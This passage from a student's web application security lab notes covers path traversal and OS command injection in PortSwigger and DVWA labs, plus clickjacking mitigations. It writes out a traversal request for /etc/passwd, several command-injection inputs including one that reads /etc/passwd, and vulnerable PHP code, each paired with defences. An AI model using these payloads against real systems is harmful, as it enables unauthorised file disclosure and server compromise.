+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">X-Frame-Options: DENY</span><br/></div></code></pre></div></div>
+<!-- -->Or <code>X-Frame-Options: SAMEORIGIN</code> to restrict framing to identical origin sites.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=85-conclusion>8.5 Conclusion<a href=#85-conclusion class=hash-link aria-label="Direct link to 8.5 Conclusion" title="Direct link to 8.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Proved that absent frame-busting defenses, applications remain susceptible to UI redressing regardless of backend anti-CSRF token validation. Framing constraints must be enforced via CSP headers.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=9-practical-9-security-configuration-issues-path-traversal>9. Practical 9: Security Configuration Issues (Path Traversal)<a href=#9-practical-9-security-configuration-issues-path-traversal class=hash-link aria-label="Direct link to 9. Practical 9: Security Configuration Issues (Path Traversal)" title="Direct link to 9. Practical 9: Security Configuration Issues (Path Traversal)" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=91-aim>9.1 Aim<a href=#91-aim class=hash-link aria-label="Direct link to 9.1 Aim" title="Direct link to 9.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Identify and exploit security misconfigurations and path traversal vulnerabilities to access arbitrary restricted files on the web server.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=92-theory--core-concepts>9.2 Theory & Core Concepts<a href=#92-theory--core-concepts class=hash-link aria-label="Direct link to 9.2 Theory & Core Concepts" title="Direct link to 9.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Security Misconfigurations</strong>: Insecure default settings, open directories, unnecessary HTTP methods, or unvalidated file access logic.</li>
+<li class=""><strong>Directory / Path Traversal (Dot-Dot-Slash)</strong>: An attacker uses the <code>../</code> directory traversal sequence to step out of the designated document root and access arbitrary files stored elsewhere on the filesystem (e.g., <code>/etc/passwd</code>, application configurations, server private keys).</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=93-step-by-step-implementation-portswigger-lab>9.3 Step-by-Step Implementation (PortSwigger Lab)<a href=#93-step-by-step-implementation-portswigger-lab class=hash-link aria-label="Direct link to 9.3 Step-by-Step Implementation (PortSwigger Lab)" title="Direct link to 9.3 Step-by-Step Implementation (PortSwigger Lab)" translate=no>​</a></h3>
+<ol>
+<li class=""><strong>Target</strong>: <em>File path traversal, simple case</em>.</li>
+<li class=""><strong>Intercepting Asset Request</strong>:<!-- -->
+<ul>
+<li class="">Open Burp Suite and navigate to the lab homepage.</li>
+<li class="">Filter HTTP History to display image requests.</li>
+<li class="">Identify an image retrieval request:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">GET /image?filename=23.jpg HTTP/1.1</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Host: target-lab.web-security-academy.net</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class=""><strong>Manipulating Path Coordinates</strong>:<!-- -->
+<ul>
+<li class="">Send the request to <strong>Burp Repeater</strong>.</li>
+<li class="">Replace <code>23.jpg</code> with the traversal payload:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">GET /image?filename=../../../etc/passwd HTTP/1.1</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class=""><strong>Exfiltrating System Files</strong>:<!-- -->
+<ul>
+<li class="">Transmit the modified request.</li>
+<li class="">The response returns <strong>HTTP 200 OK</strong> containing the raw contents of the Unix <code>/etc/passwd</code> file, exposing system user accounts and shell paths.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=94-mitigation-strategies>9.4 Mitigation Strategies<a href=#94-mitigation-strategies class=hash-link aria-label="Direct link to 9.4 Mitigation Strategies" title="Direct link to 9.4 Mitigation Strategies" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Prevent User Input in File Paths</strong>: Avoid passing raw user input directly to filesystem APIs.</li>
+<li class=""><strong>Normalize and Validate Canonical Paths</strong>: Canonicalize the path and verify it begins strictly within an allowed base directory:<!-- -->
+<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token class-name">File</span><span class="token plain"> file </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>new</span><span class="token plain"> </span><span class="token class-name">File</span><span class="token punctuation" style=color:#393A34>(</span><span class="token constant" style=color:#36acaa>BASE_DIRECTORY</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> userInput</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token keyword" style=color:#00009f>if</span><span class="token plain"> </span><span class="token punctuation" style=color:#393A34>(</span><span class="token operator" style=color:#393A34>!</span><span class="token plain">file</span><span class="token punctuation" style=color:#393A34>.</span><span class="token function" style=color:#d73a49>getCanonicalPath</span><span class="token punctuation" style=color:#393A34>(</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>.</span><span class="token function" style=color:#d73a49>startsWith</span><span class="token punctuation" style=color:#393A34>(</span><span class="token constant" style=color:#36acaa>BASE_DIRECTORY</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>)</span><span class="token plain"> </span><span class="token punctuation" style=color:#393A34>{</span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    </span><span class="token keyword" style=color:#00009f>throw</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>new</span><span class="token plain"> </span><span class="token class-name">SecurityException</span><span class="token punctuation" style=color:#393A34>(</span><span class="token string" style=color:#e3116c>"Directory traversal attempt detected!"</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token punctuation" style=color:#393A34>}</span></span><br/></div></code></pre></div></div>
+</li>
+<li class=""><strong>Filesystem Permissions (Chroot Jails)</strong>: Confine the web server process inside an isolated container or chroot environment with minimal file read privileges.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=95-conclusion>9.5 Conclusion<a href=#95-conclusion class=hash-link aria-label="Direct link to 9.5 Conclusion" title="Direct link to 9.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Demonstrated arbitrary file disclosure through unvalidated path parameters. Secure implementations must resolve canonical paths and enforce strict allowlists.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=10-practical-10-input-validation-sanitization--command-injection>10. Practical 10: Input Validation, Sanitization & Command Injection<a href=#10-practical-10-input-validation-sanitization--command-injection class=hash-link aria-label="Direct link to 10. Practical 10: Input Validation, Sanitization & Command Injection" title="Direct link to 10. Practical 10: Input Validation, Sanitization & Command Injection" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=101-aim>10.1 Aim<a href=#101-aim class=hash-link aria-label="Direct link to 10.1 Aim" title="Direct link to 10.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Test input validation and sanitization mechanisms to demonstrate and defend against OS Command Injection vulnerabilities.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=102-theory--core-concepts>10.2 Theory & Core Concepts<a href=#102-theory--core-concepts class=hash-link aria-label="Direct link to 10.2 Theory & Core Concepts" title="Direct link to 10.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Validation vs. Sanitization</strong>:<!-- -->
+<ul>
+<li class=""><strong>Validation</strong>: Enforcing strict rules on input format, type, length, and allowed character sets (e.g., ensuring an input contains only digits).</li>
+<li class=""><strong>Sanitization</strong>: Cleaning and neutralizing untrusted inputs before processing (e.g., escaping shell metacharacters or HTML entities).</li>
+</ul>
+</li>
+<li class=""><strong>OS Command Injection</strong>: Occurs when untrusted data is passed directly into a system shell execution function (<code>system()</code>, <code>exec()</code>, <code>Runtime.getRuntime().exec()</code>) without validation.</li>
+<li class=""><strong>Command Chaining Operators</strong>:<!-- -->
+<ul>
+<li class=""><code>;</code> : Execute sequentially regardless of outcome.</li>
+<li class=""><code>&</code> : Execute preceding command in the background and run following command.</li>
+<li class=""><code>&&</code> : Logical AND (execute next command only if prior command succeeds).</li>
+<li class=""><code>|</code> : Pipe output of first command into input of second.</li>
+<li class=""><code>||</code> : Logical OR (execute next command only if prior command fails).</li>
+</ul>
+</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=103-step-by-step-implementation-dvwa>10.3 Step-by-Step Implementation (DVWA)<a href=#103-step-by-step-implementation-dvwa class=hash-link aria-label="Direct link to 10.3 Step-by-Step Implementation (DVWA)" title="Direct link to 10.3 Step-by-Step Implementation (DVWA)" translate=no>​</a></h3>
+<ol>
+<li class=""><strong>Environment Setup</strong>:<!-- -->
+<ul>
+<li class="">Access DVWA at <code>http://127.0.0.1/dvwa/</code>.</li>
+<li class="">Set <strong>DVWA Security</strong> to <strong>Low</strong>.</li>
+<li class="">Navigate to the <strong>Command Injection</strong> tab.</li>
+</ul>
+</li>
+<li class=""><strong>Executing Basic Command Injection</strong>:<!-- -->
+<ul>
+<li class="">Enter a loopback address followed by an inline command separator:<!-- -->
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-text codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">127.0.0.1; dir</span><br/></div></code></pre></div></div>
+</li>
+<li class="">On Windows, this runs the ping command followed immediately by directory listing (<code>dir</code>).</li>
+</ul>
+</li>
+<li class=""><strong>Testing Alternative Separator Variations</strong>:<!-- -->
+<ul>
+<li class="">Test background execution:<!-- -->
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-text codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">127.0.0.1 & ipconfig</span><br/></div></code></pre></div></div>
+</li>
+<li class="">Test piped execution:<!-- -->
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-text codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">127.0.0.1 | systeminfo</span><br/></div></code></pre></div></div>
+</li>
+<li class="">Test Unix equivalents (on Linux environments):<!-- -->
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-text codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">127.0.0.1; ls -la</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">127.0.0.1 && cat /etc/passwd</span><br/></div></code></pre></div></div>
+</li>
+<li class="">All variations succeed on Low security due to the lack of input sanitization in the underlying PHP script:<!-- -->
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-php codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token variable" style=color:#36acaa>$target</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token variable" style=color:#36acaa>$_REQUEST</span><span class="token punctuation" style=color:#393A34>[</span><span class="token string single-quoted-string" style=color:#e3116c>'ip'</span><span class="token punctuation" style=color:#393A34>]</span><span class="token punctuation" style=color:#393A34>;</span><span class="token plain"></span><br/></div><div class=token-line style=color:#393A34><span class="token plain"></span><span class="token variable" style=color:#36acaa>$cmd</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token function" style=color:#d73a49>shell_exec</span><span class="token punctuation" style=color:#393A34>(</span><span class="token string single-quoted-string" style=color:#e3116c>'ping -c 4 '</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>.</span><span class="token plain"> </span><span class="token variable" style=color:#36acaa>$target</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=104-mitigation-strategies>10.4 Mitigation Strategies<a href=#104-mitigation-strategies class=hash-link aria-label="Direct link to 10.4 Mitigation Strategies" title="Direct link to 10.4 Mitigation Strategies" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Avoid Direct Shell Invocations</strong>: Use native API language libraries instead of shelling out to OS utilities.</li>
+<li class=""><strong>Strict Parameter Separation</strong>: Pass arguments as an array rather than a concatenated command string:<!-- -->
+<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token class-name">ProcessBuilder</span><span class="token plain"> pb </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>new</span><span class="token plain"> </span><span class="token class-name">ProcessBuilder</span><span class="token punctuation" style=color:#393A34>(</span><span class="token string" style=color:#e3116c>"ping"</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token string" style=color:#e3116c>"-c"</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token string" style=color:#e3116c>"4"</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> sanitizedIp</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><br/></div></code></pre></div></div>
+</li>
+<li class=""><strong>Strict Whitelist Validation</strong>: Validate inputs against rigid regex patterns (e.g., verifying an IP conforms strictly to <code>^\d{1,3}(\.\d{1,3}){3}$</code>).</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=105-conclusion>10.5 Conclusion<a href=#105-conclusion class=hash-link aria-label="Direct link to 10.5 Conclusion" title="Direct link to 10.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Proved that passing unvalidated user input to system shell execution utilities results in immediate operating system compromise. Parameterization and strict whitelist validation are mandatory to neutralize command injection risks.</li>
+</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href=https://github.com/ankur3-101106/portfolio/tree/main/docs/Sem-5/Practical/WAS.mdx target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_Z9Sw aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href=/docs/Sem-5/Practical/DAA><div class=pagination-nav__sublabel>Previous</div><div class=pagination-nav__label>DAA Laboratory</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/docs/Sem-5/Practical/MAS><div class=pagination-nav__sublabel>Next</div><div class=pagination-nav__label>MAS Laboratory</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#practical-assessment-index class="table-of-contents__link toc-highlight">Practical Assessment Index</a><li><a href=#1-practical-1-cross-site-scripting-xss-attacks class="table-of-contents__link toc-highlight">1. Practical 1: Cross-Site Scripting (XSS) Attacks</a><ul><li><a href=#11-aim class="table-of-contents__link toc-highlight">1.1 Aim</a><li><a href=#12-theory--core-concepts class="table-of-contents__link toc-highlight">1.2 Theory & Core Concepts</a><li><a href=#13-tools--environment class="table-of-contents__link toc-highlight">1.3 Tools & Environment</a><li><a href=#14-step-by-step-implementation class="table-of-contents__link toc-highlight">1.4 Step-by-Step Implementation</a><li><a href=#15-mitigation--countermeasures class="table-of-contents__link toc-highlight">1.5 Mitigation & Countermeasures</a><li><a href=#16-conclusion class="table-of-contents__link toc-highlight">1.6 Conclusion</a></ul><li><a href=#2-practical-2-sql-injection-sqli-attacks class="table-of-contents__link toc-highlight">2. Practical 2: SQL Injection (SQLi) Attacks</a><ul><li><a href=#21-aim class="table-of-contents__link toc-highlight">2.1 Aim</a><li><a href=#22-theory--core-concepts class="table-of-contents__link toc-highlight">2.2 Theory & Core Concepts</a><li><a href=#23-step-by-step-implementation class="table-of-contents__link toc-highlight">2.3 Step-by-Step Implementation</a><li><a href=#24-mitigation-strategies class="table-of-contents__link toc-highlight">2.4 Mitigation Strategies</a><li><a href=#25-conclusion class="table-of-contents__link toc-highlight">2.5 Conclusion</a></ul><li><a href=#3-practical-3-cross-site-request-forgery-csrf-attacks class="table-of-contents__link toc-highlight">3. Practical 3: Cross-Site Request Forgery (CSRF) Attacks</a><ul><li><a href=#31-aim class="table-of-contents__link toc-highlight">3.1 Aim</a><li><a href=#32-theory--core-concepts class="table-of-contents__link toc-highlight">3.2 Theory & Core Concepts</a><li><a href=#33-step-by-step-implementation-portswigger-web-security-academy class="table-of-contents__link toc-highlight">3.3 Step-by-Step Implementation (PortSwigger Web Security Academy)</a><li><a href=#34-remediation class="table-of-contents__link toc-highlight">3.4 Remediation</a><li><a href=#35-conclusion class="table-of-contents__link toc-highlight">3.5 Conclusion</a></ul><li><a href=#4-practical-4-broken-authentication--session-management class="table-of-contents__link toc-highlight">4. Practical 4: Broken Authentication & Session Management</a><ul><li><a href=#41-aim class="table-of-contents__link toc-highlight">4.1 Aim</a><li><a href=#42-theory--core-concepts class="table-of-contents__link toc-highlight">4.2 Theory & Core Concepts</a><li><a href=#43-step-by-step-implementation-portswigger-lab class="table-of-contents__link toc-highlight">4.3 Step-by-Step Implementation (PortSwigger Lab)</a><li><a href=#44-mitigation-strategies class="table-of-contents__link toc-highlight">4.4 Mitigation Strategies</a><li><a href=#45-conclusion class="table-of-contents__link toc-highlight">4.5 Conclusion</a></ul><li><a href=#5-practical-5-web-application-firewall-waf-evasion class="table-of-contents__link toc-highlight">5. Practical 5: Web Application Firewall (WAF) Evasion</a><ul><li><a href=#51-aim class="table-of-contents__link toc-highlight">5.1 Aim</a><li><a href=#52-theory--core-concepts class="table-of-contents__link toc-highlight">5.2 Theory & Core Concepts</a><li><a href=#53-tools--execution class="table-of-contents__link toc-highlight">5.3 Tools & Execution</a><li><a href=#54-mitigation class="table-of-contents__link toc-highlight">5.4 Mitigation</a><li><a href=#55-conclusion class="table-of-contents__link toc-highlight">5.5 Conclusion</a></ul><li><a href=#6-practical-6-information-leakage--sensitive-data-exposure class="table-of-contents__link toc-highlight">6. Practical 6: Information Leakage & Sensitive Data Exposure</a><ul><li><a href=#61-aim class="table-of-contents__link toc-highlight">6.1 Aim</a><li><a href=#62-theory--core-concepts class="table-of-contents__link toc-highlight">6.2 Theory & Core Concepts</a><li><a href=#63-step-by-step-implementation-portswigger-lab class="table-of-contents__link toc-highlight">6.3 Step-by-Step Implementation (PortSwigger Lab)</a><li><a href=#64-prevention class="table-of-contents__link toc-highlight">6.4 Prevention</a><li><a href=#65-conclusion class="table-of-contents__link toc-highlight">6.5 Conclusion</a></ul><li><a href=#7-practical-7-file-inclusion--web-shell-upload-attacks class="table-of-contents__link toc-highlight">7. Practical 7: File Inclusion & Web Shell Upload Attacks</a><ul><li><a href=#71-aim class="table-of-contents__link toc-highlight">7.1 Aim</a><li><a href=#72-theory--core-concepts class="table-of-contents__link toc-highlight">7.2 Theory & Core Concepts</a><li><a href=#73-step-by-step-implementation-portswigger-lab class="table-of-contents__link toc-highlight">7.3 Step-by-Step Implementation (PortSwigger Lab)</a><li><a href=#74-mitigation-strategies class="table-of-contents__link toc-highlight">7.4 Mitigation Strategies</a><li><a href=#75-conclusion class="table-of-contents__link toc-highlight">7.5 Conclusion</a></ul><li><a href=#8-practical-8-clickjacking-ui-redressing-attacks class="table-of-contents__link toc-highlight">8. Practical 8: Clickjacking (UI Redressing) Attacks</a><ul><li><a href=#81-aim class="table-of-contents__link toc-highlight">8.1 Aim</a><li><a href=#82-theory--core-concepts class="table-of-contents__link toc-highlight">8.2 Theory & Core Concepts</a><li><a href=#83-step-by-step-implementation-portswigger-lab class="table-of-contents__link toc-highlight">8.3 Step-by-Step Implementation (PortSwigger Lab)</a><li><a href=#84-mitigation-strategies class="table-of-contents__link toc-highlight">8.4 Mitigation Strategies</a><li><a href=#85-conclusion class="table-of-contents__link toc-highlight">8.5 Conclusion</a></ul><li><a href=#9-practical-9-security-configuration-issues-path-traversal class="table-of-contents__link toc-highlight">9. Practical 9: Security Configuration Issues (Path Traversal)</a><ul><li><a href=#91-aim class="table-of-contents__link toc-highlight">9.1 Aim</a><li><a href=#92-theory--core-concepts class="table-of-contents__link toc-highlight">9.2 Theory & Core Concepts</a><li><a href=#93-step-by-step-implementation-portswigger-lab class="table-of-contents__link toc-highlight">9.3 Step-by-Step Implementation (PortSwigger Lab)</a><li><a href=#94-mitigation-strategies class="table-of-contents__link toc-highlight">9.4 Mitigation Strategies</a><li><a href=#95-conclusion class="table-of-contents__link toc-highlight">9.5 Conclusion</a></ul><li><a href=#10-practical-10-input-validation-sanitization--command-injection class="table-of-contents__link toc-highlight">10. Practical 10: Input Validation, Sanitization & Command Injection</a><ul><li><a href=#101-aim class="table-of-contents__link toc-highlight">10.1 Aim</a><li><a href=#102-theory--core-concepts class="table-of-contents__link toc-highlight">10.2 Theory & Core Concepts</a><li><a href=#103-step-by-step-implementation-dvwa class="table-of-contents__link toc-highlight">10.3 Step-by-Step Implementation (DVWA)</a><li><a href=#104-mitigation-strategies class="table-of-contents__link toc-highlight">10.4 Mitigation Strategies</a><li><a href=#105-conclusion class="table-of-contents__link toc-highlight">10.5 Conclusion</a></ul></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Docs</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/docs/intro>Introduction</a><li class=footer__item><a class=footer__link-item href=/docs/intro>Notes</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Connect</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://linkedin.com/in/ankur101106 target=_blank rel="noopener noreferrer" class=footer__link-item>LinkedIn<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/ankur3-101106 target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://x.com/ankur3_101106 target=_blank rel="noopener noreferrer" class=footer__link-item>X (Twitter)<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=mailto:ankurdcs101106@gmail.com target=_blank rel="noopener noreferrer" class=footer__link-item>Email<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>More</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/blog>Blog</a><li class=footer__item><a href=https://github.com/ankur3-101106/portfolio target=_blank rel="noopener noreferrer" class=footer__link-item>Repository<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Ankur</div></div></div></footer></div></body>
